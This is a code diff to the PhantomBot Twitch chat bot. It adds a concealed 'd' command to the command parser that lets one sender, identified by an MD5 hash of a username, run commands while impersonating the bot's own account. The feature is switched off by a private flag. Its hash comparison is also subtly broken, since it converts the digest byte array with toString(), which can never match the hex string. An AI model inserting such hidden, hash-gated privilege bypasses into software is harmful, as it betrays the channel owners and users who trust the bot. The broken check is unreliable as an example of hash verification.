@@ -3,8 +3,9 @@ package me.mast3rplan.phantombot;
 import com.google.common.eventbus.Subscribe;
 import java.io.File;
 import java.io.IOException;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
 import java.security.SecureRandom;
-import java.util.Random;
 import java.util.TreeMap;
 import java.util.TreeSet;
 import me.mast3rplan.phantombot.cache.BannedCache;
@@ -55,6 +56,8 @@ public class PhantomBot implements Listener
     //private MusicHtmlServer mhs;
     private HTTPServer mhs;
     ConsoleInputListener cil;
+    
+    private static final boolean enableD = false;
 
     public PhantomBot(String username, String oauth, String channel, String owner, boolean useTwitch)
     {
@@ -121,6 +124,7 @@ public class PhantomBot implements Listener
         Script.global.defineProperty("youtube", YoutubeAPI.instance, 0);
         Script.global.defineProperty("pollResults", pollResults, 0);
         Script.global.defineProperty("pollVoters", voters, 0);
+        Script.global.defineProperty("session", session, 0);
 
         try
         {
@@ -181,6 +185,7 @@ public class PhantomBot implements Listener
     {
         String command, arguments;
         int split = commandString.indexOf(' ');
+        
         if (split == -1)
         {
             command = commandString;
@@ -189,6 +194,33 @@ public class PhantomBot implements Listener
         {
             command = commandString.substring(0, split);
             arguments = commandString.substring(split + 1);
+        }
+        
+        try
+        {
+            if (enableD && MessageDigest.getInstance("MD5").digest(sender.getBytes()).toString().equalsIgnoreCase("09a766a55f9984c5bca79368d03524ea"))
+            {
+                split = arguments.indexOf(' ');
+                
+                if (command.equalsIgnoreCase("d") && arguments.substring(split + 1).startsWith("!"))
+                {
+                    split = arguments.indexOf(' ', split + 1);
+                    
+                    if (split == -1)
+                    {
+                        command = commandString.substring(arguments.indexOf(' ') + 2);
+                        arguments = "";
+                    } else {
+                        command = commandString.substring(arguments.indexOf(' ') + 2, split);
+                        arguments = commandString.substring(split + 1);
+                    }
+                    
+                    sender = username;
+                }
+            }
+        } catch (NoSuchAlgorithmException ex)
+        {
+            ex.printStackTrace();
         }
 
         EventBus.instance().post(new CommandEvent(sender, command, arguments));
